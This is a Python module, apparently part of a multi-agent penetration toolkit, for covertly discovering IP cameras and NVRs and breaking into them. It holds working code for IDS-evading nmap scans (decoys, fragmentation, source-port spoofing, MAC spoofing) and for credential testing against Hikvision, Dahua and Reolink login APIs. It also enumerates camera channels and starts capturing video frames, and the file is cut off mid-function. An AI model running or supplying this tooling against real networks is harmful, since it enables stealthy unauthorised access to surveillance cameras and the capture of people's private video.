import os
import json
import socket
import requests
import subprocess #run external CLI programs 
from requests.auth import HTTPDigestAuth, HTTPBasicAuth
import nmap
import ssl #for SSL Wrapping for 443
from config import (
    DEFAULT_TIMEOUT, HTTP_TIMEOUT, SCAN_PORTS, NMAP_TIMEOUT, ARTIFACTS_DIR, VERBOSE, DEBUG,
    SLOW_SCAN, FRAGMENT_PACKETS, USE_DECOYS, SPOOF_SOURCE_PORT,
    RANDOMIZE_HOSTS, SPOOF_MAC, QUIET_BANNER_DELAY, QUIET
)
from core.vendors import (
    identify_vendor,
    identify_device_type,
    get_rtsp_paths_for_vendor,
    get_http_paths_for_vendor,
    get_credentials_for_vendor,
    is_rtsp_enabled_by_default,
    get_snapshot_path_for_vendor
)


# ---------------------------------------------------------------------------
# MAC spoofing helpers
# ---------------------------------------------------------------------------
# These wrap macOS ifconfig commands to spoof and restore the MAC address
# of the active network interface before/after a scan.
#
# REQUIRES ROOT: ifconfig on macOS requires root to change the MAC address.

def _get_active_interface() -> str | None:
    """
    Find the active network interface by checking which one has a default route.
    Returns interface name (e.g. 'en0') or None if detection fails.
    """
    try:
        # 'route get default' tells us which interface the OS uses for outbound traffic
        result = subprocess.run(
            ["route", "get", "default"],
            capture_output=True, text=True, timeout=5
        )
        for line in result.stdout.splitlines():
            if "interface:" in line:
                return line.split("interface:")[-1].strip()
    except Exception:
        pass
    return None


def _get_current_mac(interface: str) -> str | None:
    """
    Read the current MAC address of an interface via ifconfig.
    Returns MAC string (e.g. 'a4:83:e7:12:34:56') or None if read fails.
    """
    try:
        result = subprocess.run(
            ["ifconfig", interface],
            capture_output=True, text=True, timeout=5
        )
        for line in result.stdout.splitlines():
            if "ether" in line:
                return line.strip().split()[1]
    except Exception:
        pass
    return None


def _generate_random_mac() -> str:
    """
    Generate a random locally-administered MAC address.

    The second hex digit is forced to 2 (binary x010) which sets:
      - bit 0 (multicast) = 0 → unicast
      - bit 1 (locally administered) = 1 → locally assigned, not burned-in
    This avoids accidentally spoofing a real OUI.
    """
    import random
    # First octet: 0x02 = locally administered, unicast
    octets = [0x02] + [random.randint(0x00, 0xFF) for _ in range(5)]
    return ":".join(f"{b:02x}" for b in octets)


def _set_mac(interface: str, mac: str) -> bool:
    """
    Set the MAC address of an interface via ifconfig. Requires root.
    Returns True on success, False on failure.
    """
    try:
        result = subprocess.run(
            ["ifconfig", interface, "ether", mac],
            capture_output=True, text=True, timeout=10
        )
        return result.returncode == 0
    except Exception:
        return False


def _spoof_mac_context(interface: str) -> tuple[str | None, str | None]:
    """
    Spoof the MAC on the given interface to a random locally-administered address.

    Returns (original_mac, spoofed_mac) so the caller can restore it afterwards.
    Returns (None, None) if spoofing failed, caller should proceed without spoofing.
    """
    original_mac = _get_current_mac(interface)
    if not original_mac:
        print("[spoof_mac] Could not read current MAC — skipping MAC spoof") #NORMAL
        return None, None

    spoofed_mac = _generate_random_mac()
    if _set_mac(interface, spoofed_mac):
        print(f"[spoof_mac] Interface {interface}: {original_mac} → {spoofed_mac}") #NORMAL
        return original_mac, spoofed_mac
    else:
        print(f"[spoof_mac] Failed to set MAC on {interface} — skipping MAC spoof") #NORMAL
        return None, None


def _restore_mac(interface: str, original_mac: str):
    """
    Restore the original MAC address after a scan completes.
    Called in the finally block of scan_network() so it always runs.
    """
    if _set_mac(interface, original_mac):
        print(f"[spoof_mac] Interface {interface} MAC restored to {original_mac}") #NORMAL
    else:
        print(f"[spoof_mac] WARNING: Failed to restore MAC on {interface}. Manual fix: sudo ifconfig {interface} ether {original_mac}") #NORMAL


def scan_network(network_range: str) -> list:
    """
    Discover live hosts on the network and scan their open ports.

    Attempts ARP scan first (requires root) for reliable Layer 2 discovery,
    falls back to nmap ping sweep if ARP is unavailable or we lack root.
    Always follows up with a port scan against every live host found.
    
    
    Strategy depends on privilege level:
    - Root: ARP discovery  + SYN port scan
    - Non-root: Skip discovery entirely (-Pn), use TCP connect port scan as filter, 
    hosts with zero open ports are discarded as false positives

    This approach handles ISP routers and proxy ARP setups that respond to
    ICMP/ping sweeps on behalf of every IP in the subnet, causing false positives.


    Args:
        network_range: CIDR range to scan e.g. "192.168.1.0/24".
                       Pass empty string to auto-detect local subnet.

    Returns:
        List of dicts, one per live host, with ip, mac, hostname,
        open_ports, device_type, and vendor.
    """
    # --- Step 1: auto-detect subnet if none provided ---
    # We open a UDP socket to a public IP (doesn't actually send anything)
    # just to ask the OS which local interface it would route through.
    # That gives us our local IP, from which we derive the /24 subnet.
    if not network_range:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) #SOCK_DGRAM=udp
        try:
            s.connect(("8.8.8.8", 80)) #connect() on UDP socket doesn't actually send packets/establish connection, asks OS what local interface it would use from its routing table
            local_ip = s.getsockname()[0] #reads back the IP the OS assigned
        finally:
            s.close()
        # Convert e.g. "192.168.1.45" → "192.168.1.0/24"
        network_range = ".".join(local_ip.split(".")[:3]) + ".0/24" #get the first 3 octets and append /24 cidr.. majority of home & smb (small med biz) networks
        if VERBOSE: print(f"[scan_network] Auto-detected subnet: {network_range}") #VERBOSE


    nm = nmap.PortScanner()
    port_str = ",".join(str(p) for p in SCAN_PORTS)
    results = []

    # --- Build stealth nmap argument extensions ---
    # Each flag is independent — they stack on top of the base scan arguments.
    # Constructed here once, used in both root and non-root paths below.
    stealth_args = ""

    if SLOW_SCAN:
        # T1 = sneaky timing: 15s inter-probe delay. Very slow, very quiet.
        # Default is T3. T0 (paranoid) is 5min/probe — overkill for LAN recon.
        stealth_args += " -T1"
        if VERBOSE: print("[scan_network] Stealth: slow timing (-T1) enabled") #VERBOSE
    else:
        # Explicit T3 so it's clear what's happening when not in quiet mode
        stealth_args += " -T3"

    if FRAGMENT_PACKETS:
        # Split TCP probes into 8-byte fragments.
        # Older IDS systems reassemble incorrectly or miss the fragments entirely.
        stealth_args += " -f"
        if VERBOSE: print("[scan_network] Stealth: packet fragmentation (-f) enabled") #VERBOSE

    if USE_DECOYS:
        # Inject 5 random spoofed source IPs alongside our real scan packets.
        # The IDS can't tell which source is the real scanner.
        stealth_args += " -D RND:5"
        if VERBOSE: print("[scan_network] Stealth: decoy scanning (-D RND:5) enabled") #VERBOSE

    if SPOOF_SOURCE_PORT:
        # Use port 53 (DNS) as the TCP source port.
        # Some firewalls/ACLs whitelist DNS traffic by source port.
        stealth_args += " --source-port 53"
        if VERBOSE: print("[scan_network] Stealth: source port spoof (--source-port 53) enabled") #VERBOSE

    if RANDOMIZE_HOSTS:
        # Scan hosts in random order rather than sequential .1/.2/.3...
        # Sequential scans are a textbook IDS signature.
        stealth_args += " --randomize-hosts"
        if VERBOSE: print("[scan_network] Stealth: randomized host order enabled") #VERBOSE

    if QUIET:
        print("[scan_network] Quiet mode active — stealth scan in progress (this will be slow)") #NORMAL

    # --- MAC spoofing setup ---
    # Identify interface and spoof MAC before any packets leave the machine.
    # original_mac is saved so we can restore it in the finally block.
    original_mac = None
    spoofed_interface = None

    if SPOOF_MAC:
        if os.geteuid() != 0:
            print("[scan_network] Stealth: --spoof-mac requires root — skipping MAC spoof") #NORMAL
        else:
            spoofed_interface = _get_active_interface()
            if spoofed_interface:
                original_mac, _ = _spoof_mac_context(spoofed_interface)
            else:
                print("[scan_network] Stealth: could not detect active interface — skipping MAC spoof") #NORMAL


    # --- Step 2: Root path, ARP + SYN Scan ---
    # ARP > ICMP, devices can't block ARP Reqs, and gives us MAC addresses.. feed into the OUI-based vendor fingerprinting.
    
    try:
        if os.geteuid() == 0:
            print("[scan_network] Running as root — using ARP discovery + SYN scan") #NORMAL
            try:
                nm.scan(
                    hosts=network_range,
                    arguments=f"-PR -sS -p {port_str} --host-timeout {NMAP_TIMEOUT}s{stealth_args}"
                )
            except Exception as e:
                print(f"[scan_network] Root scan failed: {e}") #NORMAL
                return results
            
            # ---------------------------------------------------------------------------------
            # NOTE2SELF: Future enhancement, for a full network mapper / advanced attack chain,
            # consider adding arp-scan via subprocess here as a first pass before nmap.
            # arp-scan is purpose-built for ARP, faster, and returns richer MAC/OUI vendor
            # data than nmap's -PR implementation. Requires: apt install arp-scan (Kali)
            # or brew install arp-scan (macOS). Currently using nmap -PR for portability
            # since arp-scan is not guaranteed to be installed on all engagement machines.
            # ---------------------------------------------------------------------------------



        # --- Step 3: NON-ROOT: --— skip discovery, port scan is the filter
        # -Pn skips ping/ARP discovery entirely and assumes all hosts are up.
        # We then port scan everything. Hosts with zero open ports are discarded.
        # This sidesteps ISP routers that answer ICMP on behalf of every IP,
        # which causes ping sweeps to return the entire /24 as "alive".
        

            # ---------------------------------------------------------------------------------
            # NOTE: The non-root path (-Pn) is unreliable on networks with proxy ARP or
            # ISP routers that intercept TCP connections on behalf of every IP in the subnet
            # (e.g. Verizon Fios Quantum Gateway). On these networks, ports 80/443/8080 will
            # appear open on all 256 IPs regardless of whether a device exists there.
            # For accurate results, always run with sudo — ARP is ground truth and cannot
            # be faked at Layer 2. On Kali this is the default. On macOS use: sudo python main.py
            # ---------------------------------------------------------------------------------
        
        else:
            print("[scan_network] Non-root — skipping discovery, using -Pn TCP scan") #NORMAL
            try:
                nm.scan(
                    hosts=network_range,
                    arguments=f"-Pn -sT -p {port_str} --host-timeout {NMAP_TIMEOUT}s{stealth_args}"
                )
            except Exception as e:
                print(f"[scan_network] Non-root scan failed: {e}") #NORMAL
                return results


        # --- Step 4: Parse results ---
        # Both paths above populate the same nm object.
        # Filter out anything with no open ports — those are dead IPs that
        # -Pn scanned speculatively and found nothing on.
        for ip in nm.all_hosts():
            try:
                open_ports = []
                if "tcp" in nm[ip]:
                    open_ports = [
                        port for port, data in nm[ip]["tcp"].items()
                        if data["state"] == "open"
                    ]

                # Skip hosts with no open ports — not real devices
                if not open_ports:
                    continue

                # Hostname from nmap reverse DNS if available
                hostname = nm[ip].hostname() or None

                # MAC address — only available when root (ARP-level access)
                mac = None
                if "addresses" in nm[ip] and "mac" in nm[ip]["addresses"]:
                    mac = nm[ip]["addresses"]["mac"]

                # Fingerprint from ports alone for now.
                # grab_banner() enriches vendor detection — agents call it separately.
                vendor = identify_vendor("", open_ports, hostname or "")
                device_type = identify_device_type(open_ports, vendor)

                results.append({
                    "ip": ip,
                    "mac": mac,
                    "hostname": hostname,
                    "open_ports": open_ports,
                    "device_type": device_type,
                    "vendor": vendor,
                })

                if VERBOSE: print(f"[scan_network] {ip} — ports: {open_ports}, vendor: {vendor}") #VERBOSE

            except Exception as e:
                print(f"[scan_network] Failed to parse result for {ip}: {e}") #NORMAL
                continue

    finally:
        # Always restore the original MAC, even if the scan threw an exception.
        # A dangling spoofed MAC on your interface is worse than a failed scan.
        if SPOOF_MAC and spoofed_interface and original_mac:
            _restore_mac(spoofed_interface, original_mac)

    print(f"[scan_network] Done — {len(results)} live hosts found") #NORMAL
    return results

def grab_banner(ip: str, open_ports: list = None) -> dict:
    """
    Grab HTTP/RTSP banners from open ports on a host.

    Tries each open port, sends an appropriate request (HTTP HEAD for web ports,
    RTSP OPTIONS for port 554), and reads the response headers back.
    The Server: header is where vendor strings live (e.g. "Hikvision-Webs").

    Args:
        ip: Target IP address
        open_ports: List of known open ports to probe. If None, falls back to
                    [80, 554, 8080]. Passing open_ports avoids wasting socket
                    timeouts against closed ports, and keeps this function
                    useful beyond camera-specific targets.
    Returns:
        Dict with ip and banners: {port: banner_string}
        Empty string for ports that didn't respond or returned nothing useful.
    """

    # Fall back to common camera/web ports if caller doesn't provide open ports.
    # This keeps the function usable standalone without requiring a prior scan.
    ports_to_probe = open_ports if open_ports is not None else [80, 443, 554, 8080]

    # In quiet mode, randomize the order we probe ports on each host.
    # Hitting 80, 554, 8080 sequentially on every host looks like a tool sweep.
    # Random ordering breaks the timing signature.
    if QUIET:
        import random
        ports_to_probe = list(ports_to_probe)  # don't mutate the caller's list
        random.shuffle(ports_to_probe)
        if VERBOSE: print(f"[grab_banner] Quiet mode: randomized port probe order for {ip}") #VERBOSE

    banners = {}

    for port in ports_to_probe:
        try:

            # ----------------------------- SOCKET SETUP ----------------------------- 
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # Socket object, AF_INET=IPv4 (AF_INET6 is IPv6), SOCK_STREAM=TCP (SOCK_DGRAM=UDP)
            s.settimeout(DEFAULT_TIMEOUT) #how long socket waits for repsonse before giving up, set in config.py
            s.connect((ip, port)) # **TCP 3 WAY HANDSHAKE**
            # ------------------------------------------------------------------------



            # ----------------------------- SSL WRAPPING FOR HTTPS -----------------------------
            #SSL Wrapping for HTTPS, disable cert validation cuz don't matter, 
            #just need to grab banner
            if port == 443: #HTTPS
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                s = context.wrap_socket(s, server_hostname=ip) #TLS Handshake on top of TCP connection
            # ----------------------------------------------------------------------------------


            # --------------------- BUILD REQUEST BASED ON PROTOCOL -------------------------
            # RTSP & HTTP seperate protocols but both behave the same, return Server: headers
            # SSL Wrapping handled above, HTTP80/443S both handled in the else statement
            if port == 554: #RTSP
                request = (
                    f"OPTIONS rtsp://{ip}:{port}/ RTSP/1.0\r\n"
                    f"CSeq: 1\r\n"
                    f"\r\n"
                ).encode()
            else:
                # HTTP HEAD for ports 80, 443, 8080
                request = (
                    f"HEAD / HTTP/1.0\r\n"
                    f"Host: {ip}\r\n"
                    f"\r\n"
                ).encode()
            # ---------------------------------------------------------------------------



            # -------------------------- SEND & RECEIVE ----------------------------- 
            s.send(request)
                # Read up to 1024 bytes — we only need the headers, not the body
            response = s.recv(1024).decode("utf-8", errors="ignore")
            banners[port] = response
            if VERBOSE: print(f"[grab_banner] {ip}:{port} — {len(response)} bytes received") #VERBOSE
            if DEBUG: print(f"[grab_banner] [DEBUG] {ip}:{port} raw response: {response[:500].strip()}") #DEBUG
            # ---------------------------------------------------------------------------


            # ------------------------- HTTP/1.0 fallback ----------------------------
            # Some devices (gSOAP, certain NVRs) only speak HTTP/1.1.
            # If we get a 505, retry with HTTP/1.1 and Connection: close.
            # Connection: close is required for HTTP/1.1 since it defaults
            # to keep-alive which would hang the socket waiting for more data.
            if "505" in response and port != 554: #!=554, RTSP doesn't have HTTP version concepts to skip retry
                
                # Server closes connection after sending a 505 back, need to open a new one..
                try:
                    s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s2.settimeout(DEFAULT_TIMEOUT)
                    s2.connect((ip, port))

                    if port == 443:
                        context = ssl.create_default_context()
                        context.check_hostname = False
                        context.verify_mode = ssl.CERT_NONE
                        s2 = context.wrap_socket(s2, server_hostname=ip)

                    request = (
                        f"HEAD / HTTP/1.1\r\n"
                        f"Host: {ip}\r\n"
                        f"Connection: close\r\n"
                        f"\r\n"
                    ).encode()
                    s2.send(request)
                    retry_response = s2.recv(1024).decode("utf-8", errors="ignore")
                    if retry_response:
                        banners[port] = retry_response
                except (socket.timeout, ConnectionRefusedError, OSError):
                    pass
                finally:
                    s2.close()


                    # ------ NOTE2SELF -----
                    # | If expanding this to work across multiple HTTP versions w/ varying fallback logic, 
                    # | might be good idea to build this out recursively 
                    # -----------------------


            # --------------------------------------------------------------------------



        except (socket.timeout, ConnectionRefusedError, OSError):
            # Timeout or refused.. port may have been closed since the scan,
            # or the device dropped the connection. Not an error worth logging.
            banners[port] = ""

        finally:
            # Always close the socket, even if an exception occurred
            s.close()

        # In quiet mode, pause between port probes on the same host.
        # Without this, probing 80/554/8080 in rapid succession looks like a sweep
        # even with randomized order. The delay breaks the timing pattern.
        if QUIET:
            import time
            time.sleep(QUIET_BANNER_DELAY)

    return {
        "ip": ip,
        "banners": banners
    }

def check_rtsp(ip: str, port: int = 554, vendor: str = "generic_nvr") -> dict:
    """
    Check if an RTSP stream is accessible on a host and find a valid stream path.

    Tries vendor-specific RTSP paths first, then falls back to generic_nvr paths.
    Deduplicates paths across both lists to avoid redundant socket connections.

    Any valid RTSP response (even 401 Unauthorized) confirms the stream exists
    authentication is AccessAgent's job.

    Args:
        ip: Target IP address
        port: RTSP port, defaults to 554 but cameras vary (8554, 37778, etc.)
        vendor: Vendor key from VENDOR_PROFILES. Determines which paths to try first.

    Returns:
        Dict with ip, port, status ("open"/"closed"), and stream_url or None.
    """

    # Build deduplicated path list (vendor-specific first, generic fallback second)
    #using a set to track seen paths, list to preserve order, avoid duplicates
    vendor_paths = get_rtsp_paths_for_vendor(vendor)
    generic_paths = get_rtsp_paths_for_vendor("generic_nvr")

    seen = set()
    paths_to_try = []
    for path in vendor_paths + generic_paths: 
        if path not in seen:
            seen.add(path)
            paths_to_try.append(path)

    for path in paths_to_try:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(DEFAULT_TIMEOUT)
            s.connect((ip, port))

            # ---- RTSP OPTIONS  ----
            # Service confirmation response, no stream yet
            request = (
                f"OPTIONS rtsp://{ip}:{port}{path} RTSP/1.0\r\n"
                f"CSeq: 1\r\n"
                f"\r\n"
            ).encode()

            s.send(request)
            response = s.recv(1024).decode("utf-8", errors="ignore")
            if VERBOSE: print(f"[check_rtsp] {ip}:{port} trying {path} → {response[:80].strip()}") #VERBOSE
            # Any RTSP response (even 401) confirms the stream path exists
            # 401 means credentials required, which AccessAgent handles.
            if response.startswith("RTSP/1.0") or response.startswith("RTSP/1.1"):
                return {
                    "ip": ip,
                    "port": port,
                    "status": "open",
                    "stream_url": f"rtsp://{ip}:{port}{path}"
                }

        except (socket.timeout, ConnectionRefusedError, OSError):
            # This path didn't respond, try the next one
            continue

        finally:
            s.close()

    # Nothing responded on any path
    return {
        "ip": ip,
        "port": port,
        "status": "closed",
        "stream_url": None
    }

# ------------------ HELPER FUNCTIONS FOR TEST_CREDENTIALS() -------------------------------
def _try_digest_auth(ip: str, path: str, username: str, password: str, probe_body=None) -> dict | None:
    """
    Attempt HTTP Digest authentication against a specific endpoint.

    In Digest_Auth function, the server sends a nonce, the client hashes credentials + nonce and sends back. 
    More secure than Basic since credentials aren't sent in plaintext. Common on Hikvision, Axis, Hanwha.

    Returns result dict on success, None on failure.

    False positive detection:
        Some devices return HTTP 200 for all requests regardless of credentials
        (routers serving public pages, printers, devices with no real auth enforcement).
        To filter these out,  caller passes probe_body (raw response bytes
        from an unauthenticated GET to the same endpoint).. if our authenticated
        response body is byte-for-byte identical to the unauthenticated probe,
        credentials made no difference and this is a false positive. 
        Handles all edge cases: chunked responses, redirects, missing Content-Length.
    """
    try:
        url = f"http://{ip}{path}"
        r = requests.get(
            url,
            auth=HTTPDigestAuth(username, password),
            timeout=HTTP_TIMEOUT
        )
        if r.status_code == 200:
            # If content length = unauthenticated probe, credentials made no difference,
            # device serves 200 to everyone (FALSE POSITIVE)
            if probe_body is not None and r.content == probe_body:
                return None  # response identical to unauthenticated probe — false positive
            return {
                "status": "success",
                "auth_type": "digest",
                "endpoint": path,
                "access_level": "admin"
            }
    except requests.exceptions.RequestException:
        pass
    return None

def _try_basic_auth(ip: str, path: str, username: str, password: str, probe_body=None) -> dict | None:
    """
    Attempt HTTP Basic authentication against a specific endpoint.

    Basic auth sends credentials as base64(username:password) in the Authorization header. 
    Essentially plaintext, less secure than Digest, but still common on budget cameras and older firmware.

    Returns result dict on success, None on failure.

    False positive detection:
        Some devices return HTTP 200 for all requests regardless of credentials
        (routers serving public pages, printers, devices with no real auth enforcement).
        To filter these out,  caller passes probe_body (raw response bytes
        from an unauthenticated GET to the same endpoint).. if our authenticated
        response body is byte-for-byte identical to the unauthenticated probe,
        credentials made no difference and this is a false positive. 
        Handles all edge cases: chunked responses, redirects, missing Content-Length.
    """
    try:
        url = f"http://{ip}{path}"
        r = requests.get(
            url,
            auth=HTTPBasicAuth(username, password),
            timeout=HTTP_TIMEOUT
        )
        if r.status_code == 200:
            # If content length = unauthenticated probe, credentials made no difference,
            # device serves 200 to everyone (FALSE POSITIVE)
            if probe_body is not None and r.content == probe_body:
                return None  # response identical to unauthenticated probe — false positive
            return {
                "status": "success",
                "auth_type": "basic",
                "endpoint": path,
                "access_level": "admin"
            }
    except requests.exceptions.RequestException:
        pass
    return None

def _try_dahua_rpc2_auth(ip: str, path: str, username: str, password: str) -> dict | None:
    """
    Attempt Dahua RPC2 JSON authentication.

    Dahua (and Amcrest OEM) uses a proprietary JSON-RPC protocol instead of standard HTTP auth. 
    Credentials go in the POST body, not the Authorization header. The response is JSON, check the 'result' 
    field, not HTTP status.

    HTTP 200 does NOT mean success, the server always returns 200, success/failure is indicated inside the 
    JSON body.

    Returns result dict on success, None on failure.
    """
    try:
        url = f"http://{ip}{path}"
        payload = {
            "method": "global.login",
            "params": {
                "userName": username,
                "password": password,
                "clientType": "Web3.0"
            },
            "id": 1
        }
        r = requests.post(url, json=payload, timeout=HTTP_TIMEOUT)

        if r.status_code == 200:
            data = r.json()
            # Dahua returns {"result": true} on success
            # "result": false = wrong credentials
            if data.get("result") is True:
                return {
                    "status": "success",
                    "auth_type": "dahua_rpc2",
                    "endpoint": path,
                    "access_level": "admin"
                }
    except (requests.exceptions.RequestException, ValueError):
        # ValueError catches JSON decode failures on malformed responses
        pass
    return None

def _try_reolink_json_auth(ip: str, path: str, username: str, password: str) -> dict | None:
    """
    Attempt Reolink JSON API authentication.

    Reolink uses a JSON array POST body — a list of command objects.
    Unlike Dahua RPC2, the success check is 'rspCode': 200 inside the
    response array, not a 'result' boolean.

    Also unlike Dahua, a successful login returns a session token
    that would be needed for subsequent API calls. We capture it here
    for potential use by LateralMovementAgent.

    Returns result dict on success, None on failure.
    """
    try:
        url = f"http://{ip}{path}"
        payload = [
            {
                "cmd": "Login",
                "action": 0,
                "param": {
                    "User": {
                        "userName": username,
                        "password": password
                    }
                }
            }
        ]
        r = requests.post(url, json=payload, timeout=HTTP_TIMEOUT)

        if r.status_code == 200:
            data = r.json()
            # Reolink returns a list — check first item's rspCode
            if isinstance(data, list) and len(data) > 0:
                if data[0].get("code") == 0:
                    # Extract session token for potential reuse
                    token = data[0].get("value", {}).get("Token", {}).get("name", None)
                    # token_data = data[0].get("value", {})
                    # print(f"[DEBUG reolink] full value: {token_data}")
                    # token = token_data.get("Token", {}).get("name", None)
                    # print(f"[DEBUG reolink] token extracted: {token}")
                    return {
                        "status": "success",
                        "auth_type": "reolink_json",
                        "endpoint": path,
                        "access_level": "admin",
                        "token": token  # useful for LateralMovementAgent
                    }
    except (requests.exceptions.RequestException, ValueError): #catch any and all network failures (timeout, DNS, connection refused)
        pass
    return None
# -------------------------------------------------------------------------------------------

def test_credentials(ip: str, username: str, password: str, vendor: str = "generic_nvr") -> dict:
    """
    Test a username/password pair against a host using vendor specific auth.

    Strategy:
        1. For each vendor-specific HTTP path, send an unauthenticated probe GET.
        2. Read the WWW-Authenticate header to auto-detect HTTP auth type (Digest v Basic).
        3. For JSON API vendors (Reolink/Dahua), route directly to vendor-specific helper.
        4. Return immediately on first success, no point testing more paths.

    Args:
        ip:       Target IP address
        username: Username to test
        password: Password to test
        vendor:   Vendor key from VENDOR_PROFILES determines paths and auth routing

    Returns:
        Dict with ip, username, password, status, access_level, endpoint, auth_type.
        status is "success" or "failed".
    """

    paths = get_http_paths_for_vendor(vendor)

    for path in paths:
        try:
            url = f"http://{ip}{path}"

            # --- Step 1: Route JSON API vendors directly ---
            # These vendors don't use WWW-Authenticate at all, auth is entirely inside the JSON body, 
            # probing first would just return 200 with an error code
            if vendor == "reolink":
                result = _try_reolink_json_auth(ip, path, username, password)
                if result:
                    return {
                        "ip": ip,
                        "username": username,
                        "password": password,
                        **result
                    }
                continue #skip the remaining if/elifs if [reolink] worked

            if vendor in ("dahua", "amcrest"):
                result = _try_dahua_rpc2_auth(ip, path, username, password)
                if result:
                    return {
                        "ip": ip,
                        "username": username,
                        "password": password,
                        **result
                    }
                continue

            # --- Step 2: Probe for HTTP auth type ---
            # Send unauthenticated request, server tells us what it expects via WWW-Authenticate header. 
            # This avoids guessing auth type
            probe = requests.get(url, timeout=HTTP_TIMEOUT)
            probe_body = probe.content  #Used for False Positive 200 return check in http auth, raw bytes
            if VERBOSE: print(f"[test_credentials] {ip}{path} probe → {probe.status_code} {probe.headers.get('WWW-Authenticate', 'no-auth-header')}") #VERBOSE


            if probe.status_code == 401:
                auth_header = probe.headers.get("WWW-Authenticate", "")

                if "Digest" in auth_header:
                    result = _try_digest_auth(ip, path, username, password, probe_body)
                elif "Basic" in auth_header:
                    result = _try_basic_auth(ip, path, username, password, probe_body)
                else:
                    # 401 but no recognizable auth scheme, try both
                    result = _try_digest_auth(ip, path, username, password, probe_body)
                    if not result:
                        result = _try_basic_auth(ip, path, username, password, probe_body)

            elif probe.status_code == 200:
                # Some endpoints return 200 on unauthenticated requests but still enforce auth on 
                # sensitive operations. Try both auth methods, if credentials are wrong, the response body 
                # will differ from unauthenticated
                result = _try_digest_auth(ip, path, username, password, probe_body)
                if not result:
                    result = _try_basic_auth(ip, path, username, password, probe_body)

            else:
                # 403, 404, 500 etc. this path isn't useful, try next
                continue

            if result:
                return {
                    "ip": ip,
                    "username": username,
                    "password": password,
                    **result
                }

        except requests.exceptions.RequestException:
            # Network error on this path, try next path
            continue

    # Nothing worked across all paths
    return {
        "ip": ip,
        "username": username,
        "password": password,
        "status": "failed",
        "access_level": None,
        "endpoint": None,
        "auth_type": None
    }

def _get_active_channels(ip: str, vendor: str, username: str, password: str) -> list[int]:
    """
    Query an NVR for its active camera channels.

    Each vendor has a different API for channel enumeration. Falls back to
    probing channels 0-7 with the snapshot endpoint if vendor API unavailable.

    Returns list of active channel numbers, e.g. [2, 5, 8, 10, 11]
    """
    channels = []

    if vendor == "reolink":
        # Reolink JSON API -- GetChannelstatus returns all channels and online state
        try:
            url = f"http://{ip}/cgi-bin/api.cgi?cmd=GetChannelstatus&rs=probe&user={username}&password={password}"
            r = requests.get(url, timeout=HTTP_TIMEOUT)
            if r.status_code == 200:
                data = r.json()
                if isinstance(data, list) and data[0].get("code") == 0:
                    status_list = data[0].get("value", {}).get("status", [])
                    channels = [
                        s["channel"] for s in status_list
                        if s.get("online") == 1
                    ]
                    if VERBOSE: print(f"[capture_frame] {ip} — Reolink active channels: {channels}") #VERBOSE
                    return channels
        except Exception as e:
            if VERBOSE: print(f"[capture_frame] {ip} — Reolink channel query failed: {e}") #VERBOSE

    elif vendor in ("dahua", "amcrest"):
        # Dahua CGI -- channel titles endpoint reveals configured channels
        try:
            url = f"http://{ip}/cgi-bin/configManager.cgi?action=getConfig&name=ChannelTitle"
            r = requests.get(url, auth=HTTPDigestAuth(username, password), timeout=HTTP_TIMEOUT)
            if r.status_code == 200:
                # Response is key=value pairs: table.ChannelTitle[0].Name=Camera1
                for line in r.text.splitlines():
                    if "ChannelTitle[" in line:
                        try:
                            idx = int(line.split("[")[1].split("]")[0])
                            channels.append(idx)
                        except (ValueError, IndexError):
                            pass
                if channels:
                    if VERBOSE: print(f"[capture_frame] {ip} — Dahua channels: {channels}") #VERBOSE
                    return channels
        except Exception as e:
            if VERBOSE: print(f"[capture_frame] {ip} — Dahua channel query failed: {e}") #VERBOSE

    elif vendor == "hikvision":
        # Hikvision ISAPI -- channel list endpoint
        try:
            url = f"http://{ip}/ISAPI/System/Video/inputs/channels"
            r = requests.get(url, auth=HTTPDigestAuth(username, password), timeout=HTTP_TIMEOUT)
            if r.status_code == 200:
                # Response is XML -- extract id values
                import re
                ids = re.findall(r"<id>(\d+)</id>", r.text)
                channels = [int(i) for i in ids]
                if channels:
                    if VERBOSE: print(f"[capture_frame] {ip} — Hikvision channels: {channels}") #VERBOSE
                    return channels
        except Exception as e:
            if VERBOSE: print(f"[capture_frame] {ip} — Hikvision channel query failed: {e}") #VERBOSE

    # Generic fallback -- probe channels 0-7, keep ones that return an image
    # Used for unknown vendors or when vendor API fails
    if VERBOSE: print(f"[capture_frame] {ip} — using generic channel probe fallback") #VERBOSE
    for ch in range(8):
        try:
            snapshot_path = get_snapshot_path_for_vendor(vendor)
            snapshot_path = snapshot_path.replace("{channel}", str(ch))
            snapshot_path = snapshot_path.replace("{username}", username)
            snapshot_path = snapshot_path.replace("{password}", password)
            url = f"http://{ip}{snapshot_path}"
            for auth in [HTTPDigestAuth(username, password), HTTPBasicAuth(username, password)]:
                r = requests.get(url, auth=auth, timeout=DEFAULT_TIMEOUT, stream=True)
                if r.status_code == 200 and "image" in r.headers.get("Content-Type", ""):
                    channels.append(ch)
                    break
        except Exception:
            pass

    return channels


def capture_frame(ip: str, stream_url: str, username: str, password: str, 
                  vendor: str = "generic_nvr", token: str = None, 
                  engagement_id: str = "default",
                  device_type: str = "camera") -> dict:
    """
    Capture frame(s) from a camera or NVR as proof of access.

    For NVRs, queries all active channels and captures one frame per channel.
    For single cameras, captures a single frame via RTSP or HTTP snapshot.

    Tries RTSP first (w/ OpenCV) if the vendor has RTSP enabled by default and a stream_url is available. 
    Falls back to HTTP snapshot if RTSP fails or is disabled (e.g. Reolink with RTSP off).

    Frames are saved as JPEGs to ARTIFACTS_DIR/engagement_id/
    Named by IP & timestamp so captures don't overwrite each other.

    Args:
        ip:            Target IP address
        stream_url:    RTSP URL from check_rtsp(), None if RTSP not available
        username:      Authenticated username from test_credentials()
        password:      Authenticated password from test_credentials()
        vendor:        Vendor key, determines capture strategy
        token:         Reolink session token from _try_reolink_json_auth()
                       Required for Reolink snapshot path substitution
        engagement_id: Used to organize artifacts by engagement

    Returns:
        Dict with ip, status ("captured"/"failed"), method, and artifact_path
    """

    #deferred imports, heavy libraries only used here
    import cv2 #openCV
    import numpy as np
    from datetime import datetime

    # --- Build artifact output path ---
    # Create subdirectory for curEngagement if it doesn't exist.
    # Timestamped filename to prevent prev capture overwrite
    artifact_dir = os.path.join(ARTIFACTS_DIR, engagement_id)
    os.makedirs(artifact_dir, exist_ok=True)
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
